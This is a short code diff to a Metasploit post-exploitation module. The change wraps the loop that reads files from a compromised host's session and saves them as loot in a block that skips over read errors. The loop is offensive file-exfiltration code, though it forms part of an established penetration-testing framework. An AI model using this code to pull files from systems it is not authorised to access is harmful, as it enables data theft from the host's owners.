@@ -75,11 +75,16 @@ class MetasploitModule < Msf::Post
     end
 
     getfile.each do |file|
-      filename = "#{file['path']}\\#{file['name']}"
-      data = read_file(filename)
-      print_status("Downloading #{file['path']}\\#{file['name']}")
-      p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
-      print_good("#{file['name']} saved as: #{p}")
+      # fix : Post failed: EOFError EOFError pool.rb:84:in `read',now next
+      begin
+        filename = "#{file['path']}\\#{file['name']}"
+        data = read_file(filename)
+        print_status("Downloading #{file['path']}\\#{file['name']}")
+        p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
+        print_good("#{file['name']} saved as: #{p}")
+      ensure
+        next
+      end
     end
   end
 
